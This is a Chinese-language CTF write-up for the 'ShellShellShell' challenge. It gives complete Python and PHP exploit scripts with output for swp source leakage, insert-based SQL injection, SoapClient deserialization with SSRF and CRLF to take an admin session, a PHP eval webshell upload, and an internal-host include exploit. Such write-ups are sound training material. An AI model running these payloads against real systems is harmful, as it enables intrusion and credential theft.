[中文](./README_zh.md) [English](./README.md)

[dockerfile](./dockerfile)

# ShellShellShell

### 写在前面的话

赛题的第一层取自@wupco师傅的`Easy&&Hard Php`，第二层最接近的应该是上海信安竞赛的一道web题，非常感谢各位师傅。另外，主要是因为当时事情比较繁忙、加之准备得比较仓促，本人在这事上也偷懒了，所以没有做太多的修改，更多的只是把它们连接起来然后就出成一道赛题，我知道这可能会导致很多师傅的不满，这里我也是非常抱歉。无论如何，还是希望师傅们都各有所获吧。掌握了的师傅们就当做复习巩固，没有掌握的师傅们就当做磨炼锻炼。

### 整体解题思路

解题思路：赛题分为两层，需要先拿到第一层的webshell，然后做好代理，渗透内网获取第二层的webshell，最后在内网的主机中找到flag文件获取flag。(以下给出的脚本文件当中ip地址需要进行对应的修改)

第一层获取webshell主要通过以下的步骤：
1.可利用swp源码泄露，获取所有的源码文件。
2.利用insert sql注入拿到管理员的密码md5值，然后在md5网站上解密得到密码明文。
3.利用反序列化漏洞调用内置类`SoapClient`触发SSRF漏洞，再结合CRLF漏洞，实现admin登录，获取admin登录后的session值。
4.登录admin成功之后，会发现有一个很简单文件上传功能，上传木马即可getshell。

获取泄露的swp文件的脚本`GetSwp.py`
```
#coding=utf-8
# import requests
import urllib
import os
os.system('mkdir source')
os.system('mkdir source/views')
file_list=['.index.php.swp','.config.php.swp','.user.php.swp','user.php.bak','views/.delete.swp','views/.index.swp','views/.login.swp','views/.logout.swp','views/.profile.swp','views/.publish.swp','views/.register.swp']
part_url='http://45.76.187.90:11027/'
for i in file_list:
    url=part_url+i
    print 'download %s '% url
    os.system('curl '+url+'>source/'+i)


```

### sql注入点分析

先在`config.php`看到了全局过滤：
```php
function addslashes_deep($value)
{
    if (empty($value))
    {
        return $value;
    }
    else
    {
        return is_array($value) ? array_map('addslashes_deep', $value) : addslashes($value);
    }
}
function addsla_all()
{
    if (!get_magic_quotes_gpc())
    {
        if (!empty($_GET))
        {
            $_GET  = addslashes_deep($_GET);
        }
        if (!empty($_POST))
        {
            $_POST = addslashes_deep($_POST);
        }
        $_COOKIE   = addslashes_deep($_COOKIE);
        $_REQUEST  = addslashes_deep($_REQUEST);
    }
}
addsla_all();
```
这样过滤之后，简单的注入就不存在了。
在`user.php`中看到`insert`函数，代码如下：

```php
 private function get_column($columns){
        if(is_array($columns))
            $column = ' `'.implode('`,`',$columns).'` ';
        else
            $column = ' `'.$columns.'` ';
        return $column;
    }    
public function insert($columns,$table,$values){
        $column = $this->get_column($columns);
        $value = '('.preg_replace('/`([^`,]+)`/','\'${1}\'',$this->get_column($values)).')';
        $nid =
        $sql = 'insert into '.$table.'('.$column.') values '.$value;
        $result = $this->conn->query($sql);
        return $result;
    }
```
看对`$value`的操作，先将`$value`数组的每个值用反引号引起来，然后再用逗号连接起来，变成这样的字符串：
```
`$value[0]`,`$value[1]`，`$value[1]`
```
然后再执行
```php
$value = '('.preg_replace('/`([^`,]+)`/','\'${1}\'',$this->get_column($values)).')';
```

preg_replace的意图是把反引号的单引号进行替换（核心操作是如果一对反引号中间的内容不存在逗号和反引号，就把反引号变为单引号,所以`$value`就变为了）

```
('$value[0]','$value[1]'，'$value[1]')
```

但是如果`$value`元素本身带有反引号，就会破坏掉拼接的结构，在做反引号变为单引号的时候造成问题，比如说:
```
考虑$value为 : array("admin`,`1`)#","password")
经过处理后，就变为了 : ('admin','1')#`,'password' )
相当于闭合了单引号，造成注入。
```

看到`insert`函数在`publish`函数中被调用，并且存在`$_POST['signature']`变量可控，注入点就在这里：
```php
  @$ret = $db->insert(array('userid','username','signature','mood'),'ctf_user_signature',array($this->userid,$this->username,$_POST['signature'],$mood));
```

实质是把$value中的反引号替换为单引号时，如果$value中本来就带有反引号，就有可能导致注入(addslashes函数不会对反引号过滤)

#### `sql_exp.py`

利用sql注入漏洞注入出管理员账号密码的脚本。

```
#coding=utf-8
import re
import string
import random
import requests
import subprocess
import hashlib
from itertools import product

_target='http://20.20.20.128:11027/index.php?action='

def get_code_dict():
    c = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_ []{}<>~`+=,.;:/?|'
    captchas = [''.join(i) for i in product(c, repeat=3)]

    print '[+] Genering {} captchas...'.format(len(captchas))
    with open('captchas.txt', 'w') as f:
        for k in captchas:
            f.write(hashlib.md5(k).hexdigest()+' --> '+k+'\n')

def get_creds():
    username = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10))
    password = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10))
    return username, password

def solve_code(html):
    code = re.search(r'Code\(substr\(md5\(\?\), 0, 5\) === ([0-9a-f]{5})\)', html).group(1)
    solution = subprocess.check_output(['grep', '^'+code, 'captchas.txt']).split()[2]
    return solution

def register(username, password):
    resp = sess.get(_target+'register')
    code = solve_code(resp.text)
    sess.post(_target+'register', data={'username':username,'password':password,'code':code})
    return True

def login(username, password):
    resp = sess.get(_target+'login')
    code = solve_code(resp.text)
    sess.post(_target+'login', data={'username':username,'password':password,'code':code})
    return True

def publish(sig, mood):
    return sess.post(_target+'publish', data={'signature':sig,'mood':mood})

get_code_dict()

sess = requests.Session()
username, password = get_creds()
print '[+] register({}, {})'.format(username, password)
register(username, password)
print '[+] login({}, {})'.format(username, password)
login(username, password)
print '[+] user session => ' + sess.cookies.get_dict()['PHPSESSID']

for i in range(1,33): # we know password is 32 chars (md5)
    mood = '(select concat(`O:4:\"Mood\":3:{{s:4:\"mood\";i:`,ord(substr(password,{},1)),`;s:2:\"ip\";s:14:\"80.212.199.161\";s:4:\"date\";i:1520664478;}}`) from ctf_users where is_admin=1 limit 1)'.format(i)
    payload = 'a`, {}); -- -'.format(mood)
    resp = publish(payload, '0')

resp = sess.get(_target+'index')
moods = re.findall(r'img/([0-9]+)\.gif', resp.text)[::-1] # last publish will be read first in the html
admin_hash = ''.join(map(lambda k: chr(int(k)), moods))

print '[+] admin hash => ' + admin_hash

```

```
root@kali64:~# python sql_exp.py 
[+] Genering 778688 captchas...
[+] register(cvnyshokxj, sjt0ayo3c1)
[+] login(cvnyshokxj, sjt0ayo3c1)
[+] user session => 7fublips3949q8vcs611fcdha2
[+] admin hash => c991707fdf339958eded91331fb11ba0
```

密码明文为`jaivypassword`

### getshell_1

3.利用反序列化漏洞调用内置类`SoapClient`触发SSRF漏洞，再结合CRLF漏洞，实现admin登录，获取admin登录后的session值。
4.登录admin成功之后，会发现有一个很简单文件上传功能，上传木马即可getshell。

原理:要触发这个反序列化漏洞+SSRF+CRLF漏洞登录admin，需要先利用`/index.php?action=publish`的sql注入漏洞把序列化数据插入数据库中，然后再调用`/index.php?action=index`，这时会触发代码`$data = $C->showmess();`，进而执行代码
```
	$mood = unserialize($row[2]);
	$country = $mood->getcountry();
```
这时就会触发反序列化漏洞-->SSRF漏洞-->CLRF漏洞-->登录admin。

关于第一层解题更详细的分析可以参见@wupco师傅的这篇文章`https://xz.aliyun.com/t/2148`

#### ssrf_crlf_getshell_exp.py

```
import re
import sys
import string
import random
import requests
import subprocess
from itertools import product
import hashlib
from itertools import product

_target = 'http://20.20.20.128:11027/'
_action = _target + 'index.php?action='

def get_code_dict():
    c = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_ []{}<>~`+=,.;:/?|'
    captchas = [''.join(i) for i in product(c, repeat=3)]

    print '[+] Genering {} captchas...'.format(len(captchas))
    with open('captchas.txt', 'w') as f:
        for k in captchas:
            f.write(hashlib.md5(k).hexdigest()+' --> '+k+'\n')


def get_creds():
    username = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10))
    password = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10))
    return username, password

#code
def solve_code(html):
    code = re.search(r'Code\(substr\(md5\(\?\), 0, 5\) === ([0-9a-f]{5})\)', html).group(1)
    solution = subprocess.check_output(['grep', '^'+code, 'captchas.txt']).split()[2]
    return solution

def register(username, password):
    resp = sess.get(_action+'register')
    code = solve_code(resp.text)
    sess.post(_action+'register', data={'username':username,'password':password,'code':code})
    return True

def login(username, password):
    resp = sess.get(_action+'login')
    code = solve_code(resp.text)
    sess.post(_action+'login', data={'username':username,'password':password,'code':code})
    return True

def publish(sig, mood):
    return sess.post(_action+'publish', data={'signature':sig,'mood':mood})#, proxies={'http':'127.0.0.1:8080'})

def get_prc_now():
    # date_default_timezone_set("PRC") is not important
    return subprocess.check_output(['php', '-r', 'date_default_timezone_set("PRC"); echo time();'])

def get_admin_session():
    sess = requests.Session()
    resp = sess.get(_action+'login')
    code = solve_code(resp.text)
    return sess.cookies.get_dict()['PHPSESSID'], code

get_code_dict()

print '[+] creating user session to trigger ssrf'
sess = requests.Session()

username, password = get_creds()

print '[+] register({}, {})'.format(username, password)
register(username, password)

print '[+] login({}, {})'.format(username, password)
login(username, password)

print '[+] user session => ' + sess.cookies.get_dict()['PHPSESSID']

print '[+] getting fresh session to be authenticated as admin'
phpsessid, code = get_admin_session()

ssrf = 'http://127.0.0.1/\x0d\x0aContent-Length:0\x0d\x0a\x0d\x0a\x0d\x0aPOST /index.php?action=login HTTP/1.1\x0d\x0aHost: 127.0.0.1\x0d\x0aCookie: PHPSESSID={}\x0d\x0aContent-Type: application/x-www-form-urlencoded\x0d\x0aContent-Length: 200\x0d\x0a\x0d\x0ausername=admin&password=jaivypassword&code={}&\x0d\x0a\x0d\x0aPOST /foo\x0d\x0a'.format(phpsessid, code)
mood = 'O:10:\"SoapClient\":4:{{s:3:\"uri\";s:{}:\"{}\";s:8:\"location\";s:39:\"http://127.0.0.1/index.php?action=login\";s:15:\"_stream_context\";i:0;s:13:\"_soap_version\";i:1;}}'.format(len(ssrf), ssrf)
mood = '0x'+''.join(map(lambda k: hex(ord(k))[2:].rjust(2, '0'), mood))

payload = 'a`, {}); -- -'.format(mood)

print '[+] final sqli/ssrf payload: ' + payload

print '[+] injecting payload through sqli'
resp = publish(payload, '0')

print '[+] triggering object deserialization -> ssrf'
sess.get(_action+'index')#, proxies={'http':'127.0.0.1:8080'})

print '[+] admin session => ' + phpsessid

# switching to admin session
sess = requests.Session()
sess.cookies = requests.utils.cookiejar_from_dict({'PHPSESSID': phpsessid})

# resp = sess.post(_action+'publish')
# print resp.text

print '[+] uploading stager'
shell = {'pic': ('jaivy.php', '<?php @eval($_POST[jaivy]);?>', 'image/jpeg')}
resp = sess.post(_action+'publish', files=shell)
# print resp.text
webshell_url=_target+'upload/jaivy.php'
print '[+] shell => '+webshell_url+'\n'

post_data={"jaivy":"system('ls -al');"}
resp = sess.post(url=webshell_url,data=post_data)
print resp.text

```

```
root@kali64:~# python ssrf_crlf_getshell_exp.py 
[+] Genering 778688 captchas...
[+] creating user session to trigger ssrf
[+] register(a6skt6cjpr, rw2dz23fjv)
[+] login(a6skt6cjpr, rw2dz23fjv)
[+] user session => b4sd5q2jtb0tlh4lmqoj4mcb92
[+] getting fresh session to be authenticated as admin
[+] final sqli/ssrf payload: a`, 0x4f3a31303a22536f6170436c69656e74223a343a7b733a333a22757269223b733a3237373a22687474703a2f2f3132372e302e302e312f0d0a436f6e74656e742d4c656e6774683a300d0a0d0a0d0a504f5354202f696e6465782e7068703f616374696f6e3d6c6f67696e20485454502f312e310d0a486f73743a203132372e302e302e310d0a436f6f6b69653a205048505345535349443d706f633672616771686d6e686933636e6e737136636a666332340d0a436f6e74656e742d547970653a206170706c69636174696f6e2f782d7777772d666f726d2d75726c656e636f6465640d0a436f6e74656e742d4c656e6774683a203230300d0a0d0a757365726e616d653d61646d696e2670617373776f72643d6a6169767970617373776f726426636f64653d4a3165260d0a0d0a504f5354202f666f6f0d0a223b733a383a226c6f636174696f6e223b733a33393a22687474703a2f2f3132372e302e302e312f696e6465782e7068703f616374696f6e3d6c6f67696e223b733a31353a225f73747265616d5f636f6e74657874223b693a303b733a31333a225f736f61705f76657273696f6e223b693a313b7d); -- -
[+] injecting payload through sqli
[+] triggering object deserialization -> ssrf
[+] admin session => poc6ragqhmnhi3cnnsq6cjfc24
[+] uploading stager
[+] shell => http://20.20.20.128:11027/upload/jaivy.php

total 12
drwxrwxrwx 1 root     root     4096 Aug  5 18:07 .
drwxr-xr-x 1 root     root     4096 Aug  5 18:03 ..
-rw-r--r-- 1 www-data www-data   29 Aug  5 18:07 jaivy.php

root@kali64:~# 
```

这里构造反序列化+SSRF+CRLF的时候注意几个点

- `Content-Type` 要设置成 `application/x-www-form-urlencoded`
- 验证码
- PHPSESSID
- 账号密码
- Content-Length。小心“截断”和“多取”问题导致登录失败。建议把Content-Length设置得大一些，然后再code参数后面加个与符号隔开即可。(与符号代表变量的分隔)
```
\x0ausername=admin&password=jaivypassword&code={}&\x0d\x0a\x0d\x0aPOST /foo\x0d\x0a
```

另外再放出一个构造payload的php脚本

```
<?php  
$location = "http://127.0.0.1/index.php?action=login";
$uri = "http://127.0.0.1/";
$event = new SoapClient(null,array('user_agent'=>"test\r\nCookie: PHPSESSID=gv1jimuh2ptjp1j6o2apvqp0h2\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 100\r\n\r\nusername=admin&password=jaivypassword&code=400125&xxx=",'location'=>$location,'uri'=>$uri));
$c = (serialize($event));
echo urlencode($c);
```



### getshell_2

进入内网之后通过做代理扫描即可发现还存在一个内网ip `172.18.0.2`，访问它能够发现如下代码

```
<?php
    $sandbox = '/var/sandbox/' . md5("prefix" . $_SERVER['REMOTE_ADDR']);
    @mkdir($sandbox);
    @chdir($sandbox);

    if($_FILES['file']['name'])
    {
        $filename = !empty($_POST['file']) ? $_POST['file'] : $_FILES['file']['name'];
        if (!is_array($filename)) 
        {
            $filename = explode('.', $filename);
        }
        $ext = end($filename);
        if($ext==$filename[count($filename) - 1])
        {
            die("try again!!!");
        }
        $new_name = (string)rand(100,999).".".$ext;
        move_uploaded_file($_FILES['file']['tmp_name'],$new_name);
        $_ = $_POST['hello'];
        if(@substr(file($_)[0],0,6)==='@<?php')
        {
            if(strpos($_,$new_name)===false)
            {
                include($_);
            }
            else
            {
                echo "you can do it!";
            }
        }
        unlink($new_name);
    }
    else
    {
        highlight_file(__FILE__);
    }
```

此处getshell，对应的exp如下：

```
import requests
import hashlib

target = "http://172.18.0.2/"
ip = "172.18.0.3"
path = "/var/sandbox/%s/"%hashlib.md5(("prefix"+ip).encode()).hexdigest()

#proxies={'http':'http://127.0.0.1:8080'}
files = {"file":("x",open("1.txt","rb")),"file[1]":(None,'a'),"file[0]":(None,'b'),"hello":(None,"php://filter/string.strip_tags/resource=/etc/passwd")}

try:
    for i in range(10):
        requests.post(target,files=files,)
except Exception as e:
    print(e)

for i in range(0,1000):
    files = {"file":("x",open("1.txt","rb")),"file[1]":(None,'a'),"file[0]":(None,'b'),"s":(None,"system('cat /etc/flag*');"),"hello":(None,path+str(i)+'.b')}
    resp = requests.post(target,files=files,).text
    if len(resp)>0:
        print(resp,i)
        break


```

至于如何找到flag文件，可以直接使用如下的`find`命令

```
find / -name "*flag*"
```













